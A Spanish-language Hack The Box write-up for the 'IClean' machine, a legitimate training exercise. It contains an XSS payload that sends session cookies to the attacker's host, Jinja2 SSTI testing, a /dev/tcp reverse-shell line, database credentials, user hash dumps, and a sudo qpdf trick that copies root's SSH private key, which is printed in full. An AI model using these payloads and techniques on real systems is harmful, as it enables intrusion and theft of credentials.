---
title: HTB Writeup IClean
published: true
---
---------------

![Logo](../assets/images-Iclean/Logo.png)
 
 Iclean es una maquina de dificultad medium en la cual aplique un payload de Cross-Site Scripting(XSS) en el parametro de servicio que logramos ver al interceptar la peticion con Burpusuite con esto logrue robar una cookie de session para poder entrar a un panel donde veremos que por detras como framework esta Flask, con lo cual procedo a ver como funcionaba este panel y cargar el tipico payload para comprobar que se acontece un Server-Side Template Injection(SSTI) una vez verificado procedo probar varios payloads hasta dar con uno con el cual mediante una peticion con curl consigo un reverse shell.
Para escalar a root abuse de la herramienta qpdf que podia ejecutar como sudo.


---------------------
# Reconocimiento
Primero realizo un escaneo con nmap para saber que puertos se encuentran abierto
```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.12 -oG allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 11:17 -03
Initiating SYN Stealth Scan at 11:17
Scanning 10.10.11.12 [65535 ports]
Discovered open port 22/tcp on 10.10.11.12
Discovered open port 80/tcp on 10.10.11.12
Completed SYN Stealth Scan at 11:17, 30.19s elapsed (65535 total ports)
Nmap scan report for 10.10.11.12
Host is up, received user-set (1.9s latency).
Scanned at 2024-08-01 11:17:08 -03 for 31s
Not shown: 49423 closed tcp ports (reset), 16110 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 30.28 seconds
           Raw packets sent: 118182 (5.200MB) | Rcvd: 60386 (2.415MB)
```
Lo que me reporta el puerto 22 y el 80, por lo tanto procedo a hacer un escaneo mas exhaustivo, obtengo que por el puerto 22 esta corriendo SSH y por el puerto 80 una pagina web, le echaremos un vistazo esta pagina web
```bash
❯ nmap -p22,80 -sCV 10.10.11.12 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 11:19 -03
Nmap scan report for 10.10.11.12
Host is up (1.5s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Al que al ingresar la IP veo que se esta aplicando virtual hosting, por lo tanto ingresamos el dominio capiclean.htb al `/etc/hosts`

![Virual Hosting](../assets/images-Iclean/Iclean1.png)

Veo que las tecnologías corren por detrás de esta pagina web, y veo que por detras esta Werkzeug/Python
```bash
❯ whatweb http://capiclean.htb/
http://capiclean.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@capiclean.htb], HTML5, HTTPServer[Werkzeug/2.3.7 Python/3.10.12], IP[10.10.11.12], JQuery[3.0.0], Python[3.10.12], Script, Title[Capiclean], Werkzeug[2.3.7], X-UA-Compatible[IE=edge]
```
Por lo tanto veo esta pagina web, realizare un descubrimiento de directorios para ver si encuentro algo interesante

![Web](../assets/images-Iclean/Iclean2.png)

Al hacer un descubrimiento de directorios encuentro rutas interesantes como login, services, quote, dashboard
```bash
❯ gobuster dir -u http://capiclean.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://capiclean.htb/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/about                (Status: 200) [Size: 5267]
/login                (Status: 200) [Size: 2106]
/services             (Status: 200) [Size: 8592]
/team                 (Status: 200) [Size: 8109]
/quote                (Status: 200) [Size: 2237]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 189] [--> /]
```
Intentando por la pagina de login vemos que no es vulnerable a SQLI, pero en la pagina de quote veo algo interesante por lo cual intercepto la solicitud con burpsuite

![Quote](../assets/images-Iclean/Iclean3.png)

![Burpsuite quote](../assets/images-Iclean/Iclean4.png)

Veo que tiene un campo de entrada Service por lo cual intentare ver a que es vulnerable, y confirmo que es vulnerable a XSS.
Consegui esto enviando el siguiente payload con el cual enviando una solicitud por GET a mi servidor que monte con Python 
```js
<img src="http://10.10.16.51/8001";>
```
![XSS](../assets/images-Iclean/Iclean5.png)

Veo que recibo la petición por mi servidor de python
```bash
❯ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.11.12 - - [01/Aug/2024 11:56:37] "GET / HTTP/1.1" 200 -
10.10.11.12 - - [01/Aug/2024 11:57:37] "GET / HTTP/1.1" 200 -
```
Como no tengo credenciales para autenticarme en el panel de login, y veo un dashboard voy a intentar robar la cookie de sesion con el siguiente payload
```js
<img src=x onerror=fetch("http://10.10.16.51:8001/"+document.cookie);>
```
![Cookie](../assets/images-Iclean/Iclean6.png)

Con esto obtengo la cookie de sesion
```bash
❯ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.11.12 - - [01/Aug/2024 12:02:17] code 404, message File not found
10.10.11.12 - - [01/Aug/2024 12:02:17] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqteSA.TCKarH_o8Sp_WiMbgkdBwECDMmo HTTP/1.1" 404 -
10.10.11.12 - - [01/Aug/2024 12:02:57] code 404, message File not found
10.10.11.12 - - [01/Aug/2024 12:02:57] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqteSA.TCKarH_o8Sp_WiMbgkdBwECDMmo HTTP/1.1" 404 -
```
Añado esta cookie en cookie_editor e ingresamos a /dashboard

![dashboard](../assets/images-Iclean/Iclean7.png)

Veo que con el wappylezer unas de las tecnologías que hay por detrás es Flask(normalemente cuando corre flask por detras suele acontecerse un SSTI), intentaremos realizar un SSTI

![wappylezer](../assets/images-Iclean/Iclean8.png)

----------------
# Explotación

Exploro para entender como funciona todo este, veo que puedo generar una Facturacion

![Facturacion](../assets/images-Iclean/Iclean9.png)

Con lo cual genera un ID, este sirve para ingresarlo en el generador de QR

![ID](../assets/images-Iclean/Iclean10.png)

![ID2](../assets/images-Iclean/Iclean11.png)

Con esto me genera un link para el QR, procedo a interceptar la solicitud con Burpusuite

![Burpsuite2](../assets/images-Iclean/Iclean12.png)

Primero intento inyectando `{{7*7}}` en el parametro qr_link y al ver que si me refleja el resultado de la operación, procedo a ingresar varios payloads hasta dar con el que me de resultado 

![Payload](../assets/images-Iclean/Iclean13.png)

buscando payloads encontre en [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) el siguiente payload que me sirvio.

![SSTI](../assets/images-Iclean/Iclean14.png)

Por lo tanto procedo a enviarme una reverse shell, lo consigo realizando varias pruebas, hasta vi que con curl funcionaba por lo cual creo un archivo llamado shell, con el cual me envia un reverse shell por el puerto 443, y haciendo una peticion a mi servidor obtengo una revershell
Contenido del archivo
```bash
bash -i >& /dev/tcp/10.10.16.51 0>&1
```
![Shell](../assets/images-Iclean/Iclean15.png)

![Shell2](../assets/images-Iclean/Iclean16.png)

Ahora toca hacer un tratamiento de la TTY para tener una consola totalmente interactiva
```bash
www-data@iclean:/opt/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
This account is currently not available.
Script done.
www-data@iclean:/opt/app$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
```

------------------------------------
# Escalada De Privilegios
Veo 3 archivos interesante procedo a ver el contenido de app.py
```bash
ww-data@iclean:/opt/app$ ls
 app.py
 static
 templates
```
Este contiene las credenciales para la base de datos
```bash
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
```
Lo hice de la siguiente manera porque siempre que intentaba de conectarme me daba error o se quedaba colgado.
Primero veremos las base de datos existentes
```bash
www-data@iclean:/opt/app$ mysql --database capiclean -e 'show databases;' -u iclean -p
mysql --database capiclean -e 'show databases;' -u iclean -p
Enter password: pxCsmnGLckUb
Database
capiclean
information_schema
performance_schema
```
Veremos las tablas disponibles en la base de datos capiclean
```bash
www-data@iclean:/opt/app$ mysql --database capiclean -e 'use capiclean; show tables;' -u iclean -p
mysql --database capiclean -e 'use capiclean; show tables;' -u iclean -p
Enter password: pxCsmnGLckUb
Tables_in_capiclean
quote_requests
services
users
```
Ahora iremos por la tabla users
```bash
www-data@iclean:/opt/app$ mysql --database capiclean -e 'use capiclean; show tables; select * from users' -u iclean -p
mysql --database capiclean -e 'use capiclean; show tables; select * from users' -u iclean -p
Enter password: pxCsmnGLckUb
Tables_in_capiclean
quote_requests
services
users
id	username	password	role_id
1	admin	2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51	21232f297a57a5a743894a0e4a801fc3
2	consuela	0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa	ee11cbb19052e40b07aac0ca060c23ee
```
Voy a crackear la contraseña de consuela, para eso voy a [crackstation](https://crackstation.net/) 

![Hash](../assets/images-Iclean/Iclean18.png)

obtenemos la contraseña del usuario consuela, me conectare por ssh
```bash
ssh consuela@10.10.11.12
consuela@10.10.11.12's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
```
Ya puedo ver la flag del usuario
```bash
consuela@iclean:~$ cat user.txt 
*****************43f9953
```
Como ya estoy como el usuario consuela ahora vere la forma de escalar a root
 
 -----------
### Root
Comprobando para ver si tenia algun privilegio como sudo y veo que con el usuario consuela puedo ejecutar la herramienta qpdf
```bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```
Procedo a investigar de que trata esta herramienta, encuentro la [documentacion](https://qpdf.readthedocs.io/en/stable/cli.html) de esta herramienta, y leyendo un poco veo que se  puede copiar cualquier archivo y pegarlo en cualquier directorio que tengamos acceso.
Por lo tanto decido copiarme la id_rsa de root con lo siguiente comandos `--add-attachment` para especificar el archivo que queremos copiar y la opcion `--empyt` para especificarle donde queremos que se guarde
```bash
consuela@iclean:~$ sudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa
consuela@iclean:~$ ls
id_rsa  user.txt
consuela@iclean:~$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN
vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir
dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm
JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN
EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B
AgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```
Al id_rsa de root el cual contiene su clave privada de SSH, procedo a copiarlo en mi maquina de atacante y le aplico los permisos 600
```bash
❯ nvim id_rsa
❯ chmod 600 id_rsa
❯ ssh root@10.10.11.12 -i id_rsa
```
 Una vez conectado por SSH ya puedo visualizar la flag de root
 ```bash
root@iclean:~# ls
root.txt  scripts
root@iclean:~# cat root.txt 
*********************c99f4a
```


 

